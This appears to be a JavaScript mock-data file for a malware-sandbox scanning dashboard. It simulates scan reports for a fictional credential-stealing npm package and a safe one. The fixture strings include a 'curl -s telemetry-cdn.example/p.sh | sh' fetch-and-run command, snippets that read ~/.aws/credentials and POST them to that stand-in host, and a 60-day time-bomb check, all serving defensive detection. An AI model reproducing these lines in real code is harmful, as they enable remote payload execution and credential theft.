// Sample data for the dashboard: open /?mock=1. No backend calls. Shapes match the real API
// (GET /api/scans, GET /api/scans/{id}?after=, POST /api/scans, POST .../cancel), so wiring to the live
// API is just dropping the ?mock flag.
window.VultureMock = (() => {
  const STAGES = ['fetch', 'static', 'sandbox', 'detonate', 'observe', 'investigate', 'destroy', 'analyze'];
  const shot = (label, bg) => 'data:image/svg+xml;utf8,' + encodeURIComponent(
    `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="250"><rect width="400" height="250" fill="${bg}"/><rect x="110" y="70" width="180" height="110" rx="8" fill="#fff"/><text x="200" y="105" font-family="sans-serif" font-size="14" text-anchor="middle" fill="#333">${label}</text><rect x="130" y="120" width="140" height="18" rx="3" fill="#ddd"/><rect x="130" y="146" width="140" height="18" rx="3" fill="#ddd"/></svg>`);

  const matrix = { 'developer@0': { honeytoken_hits: 0, network: 1, processes: 4 }, 'developer@+90d': { honeytoken_hits: 5, network: 3, processes: 9 },
                   'ci@0': { honeytoken_hits: 4, network: 3, processes: 8 }, 'ci@+90d': { honeytoken_hits: 5, network: 3, processes: 9 } };
  const reportMalware = () => ({
    verdict: 'malware', verdict_source: 'rules',
    rules: { verdict: 'malware', risk_score: 95, confirmed: ['planted secret marker reached the fake internet'],
      reasons: ['confirmed by observed behaviour: planted secret marker reached the fake internet', 'sent planted secrets to 1 remote endpoint(s)', 'read 4 planted credential file(s)',
                'code checks time / CI / environment before acting (possible evasion)', 'runs code at install time'], coverage: { executed: true } },
    ai: { verdict: 'malware', confidence: 0.97, note: null, summary: 'This package steals credentials at install time. Its postinstall script reads ~/.aws/credentials, ~/.npmrc and a .env file and POSTs them to telemetry-cdn.example. A second code path only fires 60+ days after install and outside CI.',
      recommendation: 'Do not install. If it was installed, rotate AWS keys and npm tokens and check CI logs.',
      indicators: [{ title: 'Credential theft in postinstall', severity: 'high', evidence: 'postinstall -> setup.js reads 4 planted files then POSTs to telemetry-cdn.example' }, { title: 'Time bomb', severity: 'medium', evidence: 'lib/bomb.js checks Date.now() > install + 60d && !process.env.CI' }],
      dormant_triggers: [{ file: 'lib/bomb.js', condition: 'more than 60 days after install and CI is not set', would_do: 'downloads and executes a second stage from telemetry-cdn.example/p.sh' }] },
    isolation: { technology: 'docker (runc) container, shares the host kernel (not a VM / gVisor)', network: 'internal docker network without internet; DNS and traffic go to a sinkhole' },
    evidence: { target: { name: 'fake-stealer', version: '2.1.0', pinned: 'fake-stealer@2.1.0', sha256: 'c0ffee0dd5a1f3a96e5bd1c6ab29e0c3a4f1d0e8b7a6c5d4e3f2a1b0c9d8e7f6' },
      honeytoken_access: [{ file: '/tmp/runs/ci-0/home/.aws/credentials', op: 'read', run: 'ci@0' }, { file: '/tmp/runs/ci-0/home/.npmrc', op: 'read', run: 'ci@0' }, { file: '/tmp/runs/dev-90/home/.env', op: 'read', run: 'developer@+90d' }],
      exfiltration: [{ kind: 'http', method: 'POST', host: 'telemetry-cdn.example', path: '/collect', port: 80 }],
      dns_lookups: ['telemetry-cdn.example'], requests: [{ kind: 'http', host: 'telemetry-cdn.example', path: '/collect', port: 80, body: '{"aws":"AKIAVLT...","npm":"npm_VLT..."}' }],
      processes: [{ argv: ['sh', '-c', 'curl -s telemetry-cdn.example/p.sh | sh'], run: 'developer@+90d' }], files_written_outside_project: ['/tmp/.cache-update'],
      install_scripts: [{ package: 'fake-stealer', hook: 'postinstall', command: 'node setup.js', is_root: true }],
      static_summary: { high: 3, medium: 2 }, matrix,
      static_findings: [{ severity: 'high', rule: 'reads-credential-files', file: 'setup.js', line: 7, snippet: "fs.readFileSync(os.homedir()+'/.aws/credentials')" }, { severity: 'high', rule: 'network-exfil', file: 'setup.js', line: 14, snippet: "https.request({host:'telemetry-cdn.example', method:'POST'})" }, { severity: 'medium', rule: 'time-gate', file: 'lib/bomb.js', line: 3, snippet: 'Date.now() > installedAt + 60*864e5' }] } });
  const reportSafe = () => ({
    verdict: 'safe', verdict_source: 'rules',
    rules: { verdict: 'safe', risk_score: 0, reasons: [], coverage: { executed: true } },
    ai: { verdict: 'safe', confidence: 0.93, summary: 'left-pad is a tiny string-padding helper. It has no install scripts, makes no network calls and touched none of the planted secrets in any persona or clock setting.', recommendation: 'Safe to install.', indicators: [], dormant_triggers: [] },
    isolation: { technology: 'docker (runc) container, shares the host kernel (not a VM / gVisor)', network: 'internal docker network without internet' },
    evidence: { target: { name: 'left-pad', version: '1.3.0', pinned: 'left-pad@1.3.0', sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08' },
      honeytoken_access: [], exfiltration: [], dns_lookups: [], requests: [], processes: [], files_written_outside_project: [], install_scripts: [], static_summary: { high: 0, medium: 0 }, static_findings: [],
      matrix: Object.fromEntries(Object.keys(matrix).map(k => [k, { honeytoken_hits: 0, network: 0, processes: 2 }])) } });

  // [seconds, stage, message, data]
  const script = (mal) => [
    [0, 'fetch', `fetching ${mal ? 'npm:fake-stealer@2.1.0' : 'left-pad@1.3.0'}`, {}],
    [1, 'static', mal ? 'static pass: 3 high, 2 medium findings' : 'static pass: no findings', {}],
    [2, 'sandbox', 'resource limits', { limits: { detonate_mem: '1g', scan_timeout: 1500 } }],
    [2.4, 'sandbox', 'creating throwaway Vultr instance', { vm: 'creating' }],
    [3.2, 'sandbox', 'VM created (a1b2c3d4), waiting for it to boot', { vm: 'created' }],
    [5, 'sandbox', 'VM booted and ready in 58s', { vm: 'ready' }],
    [5.6, 'sandbox', 'sinkhole up at 172.18.0.2', {}],
    [6, 'detonate', 'developer@0 started', { run: 'developer@0', state: 'running' }],
    [7, 'detonate', 'developer@0 done', { run: 'developer@0', state: 'done', ...(mal ? matrix['developer@0'] : { honeytoken_hits: 0, network: 0, processes: 2 }) }],
    [7.2, 'detonate', 'ci@0 started', { run: 'ci@0', state: 'running' }],
    ...(mal ? [[8, 'detonate', 'ci@0 strace timed out, retrying', { run: 'ci@0', state: 'running', retry: 1, retry_reason: 'strace timeout' }]] : []),
    [9, 'detonate', 'ci@0 done', { run: 'ci@0', state: 'done', ...(mal ? matrix['ci@0'] : { honeytoken_hits: 0, network: 0, processes: 2 }) }],
    [9.2, 'detonate', 'developer@+90d started', { run: 'developer@+90d', state: 'running' }],
    [10.4, 'detonate', 'developer@+90d done', { run: 'developer@+90d', state: 'done', ...(mal ? matrix['developer@+90d'] : { honeytoken_hits: 0, network: 0, processes: 2 }) }],
    [10.6, 'detonate', 'ci@+90d started', { run: 'ci@+90d', state: 'running' }],
    [11.6, 'detonate', 'ci@+90d done', { run: 'ci@+90d', state: 'done', ...(mal ? matrix['ci@+90d'] : { honeytoken_hits: 0, network: 0, processes: 2 }) }],
    [12, 'observe', mal ? '6 events caught by the fake internet' : '0 events caught by the fake internet', {}],
    ...(mal ? [
      [12.6, 'investigate', 'step 1: grep(pattern=Date\\.now|CI)', { step: 1, tool: 'grep', args: { pattern: 'Date\\.now|CI' }, thought: 'A time check in lib/bomb.js looks gated. Let me see what else keys off CI or dates.' }],
      [13.6, 'investigate', 'step 2: read_file(path=lib/bomb.js)', { step: 2, tool: 'read_file', args: { path: 'lib/bomb.js' }, thought: 'Second stage fires after 60 days when CI is unset. Try to trigger it.' }],
      [14.6, 'investigate', 'step 3: rerun(persona=developer, clock=+90d)', { step: 3, tool: 'rerun', args: { persona: 'developer', clock: '+90d' }, thought: 'Re-running as a developer 90 days in.' }],
      [15.4, 'observe', 'screenshot of telemetry-cdn.example/login', { screenshot: shot('Sign in to continue', '#3b4a6b'), url: 'http://telemetry-cdn.example/login', vision: 'Fake login form harvesting credentials' }],
      [16, 'investigate', 'investigation complete', { conclusion: { leaning: 'malware' } }],
    ] : [[12.6, 'investigate', 'investigation complete', { conclusion: { leaning: 'safe' } }]]),
    [17, 'destroy', 'sandbox destroyed: 4 containers, 1 network, 1 volume removed', { lifecycle: { destroyed: true } }],
    [17.2, 'destroy', 'Vultr VM destroyed', { vm: 'destroyed' }],
    [18, 'analyze', 'agent reviewing traces + dormant code', {}],
    [19, 'analyze', `verdict: ${mal ? 'MALWARE' : 'SAFE'}`, {}],
  ];

  const now = () => Date.now() / 1000;
  const scans = {};
  const finished = (id, source, verdict, ageH, mal) => scans[id] = { id, source, created: now() - ageH * 3600, mal, done: true, verdict, report: mal ? reportMalware() : reportSafe(), cancelled: false };
  finished('seed00001a', 'left-pad@1.3.0', 'safe', 2, false);
  finished('seed00002b', 'npm:fake-stealer@2.1.0', 'malware', 5, true);
  finished('seed00003c', 'is-number@7.0.0', 'safe', 26, false);
  let n = 0;
  const SPEED = 1.6;                                           // sample scans play back 1.6x

  const res = (body, status = 200) => ({ ok: status < 400, status, statusText: 'error', json: async () => body });
  function view(s, after) {
    const ev = script(s.mal).map((e, i) => ({ id: i + 1, t: e[0], stage: e[1], msg: e[2], data: e[3] }));
    const t = s.done ? 1e9 : (now() - s.created) * SPEED;
    let shown = ev.filter(e => e.t <= t);
    const last = ev[ev.length - 1], over = t >= last.t;
    if (s.cancelled) { shown = shown.concat([{ id: 900, t: Math.round(t), stage: 'destroy', msg: 'cancelled by user: sandbox destroyed', data: { vm: 'destroyed' } }]); }
    const status = s.cancelled ? 'cancelled' : over ? 'done' : t < 0.5 ? 'queued' : 'running';
    return { id: s.id, source: s.source, status, stage: shown.at(-1)?.stage ?? null, created: s.created, finished: over ? s.created + last.t : null,
      error: s.cancelled ? 'cancelled by user' : null, verdict: status === 'done' ? (s.mal ? 'malware' : 'safe') : null,
      report: status === 'done' ? (s.mal ? reportMalware() : reportSafe()) : null, lifecycle: null, events: shown.filter(e => e.id > after), stages: STAGES };
  }
  return {
    api: async (url, opts = {}) => {
      await new Promise(r => setTimeout(r, 120));
      const u = new URL(url, location.origin), p = u.pathname, m = (opts.method || 'GET').toUpperCase();
      if (p === '/api/scans' && m === 'POST') {
        const src = (opts.body.get('source') || '').trim();
        if (!src && !opts.body.get('file')) return res({ detail: 'give an npm package name, a GitHub URL, or upload a file' }, 400);
        const id = 'mock' + (++n).toString().padStart(5, '0');
        scans[id] = { id, source: src || 'upload:' + opts.body.get('file').name, created: now(), mal: /stealer|evil|malware/i.test(src) || !!opts.body.get('file') };
        return res({ id }, 201);
      }
      if (p === '/api/scans') {
        const q = u.searchParams.get('q') || '', vd = u.searchParams.get('verdict') || '', st = u.searchParams.get('status') || '', lim = +u.searchParams.get('limit') || 100;
        return res(Object.values(scans).map(s => view(s, 1e9)).filter(s => (!q || s.source.includes(q)) && (!vd || s.verdict === vd) && (!st || s.status === st))
          .sort((a, b) => b.created - a.created).slice(0, lim).map(({ id, source, status, stage, created, finished, verdict, error }) => ({ id, source, status, stage, created, finished, verdict, error })));
      }
      let mt = p.match(/^\/api\/scans\/([^/]+)(\/cancel)?$/);
      if (mt) {
        const s = scans[mt[1]]; if (!s) return res({ detail: 'no such scan' }, 404);
        if (mt[2]) { s.cancelled = true; return res({ id: s.id, cancelling: true }); }
        return res(view(s, +u.searchParams.get('after') || 0));
      }
      return res({ detail: 'not available in sample mode' }, 404);
    },
  };
})();
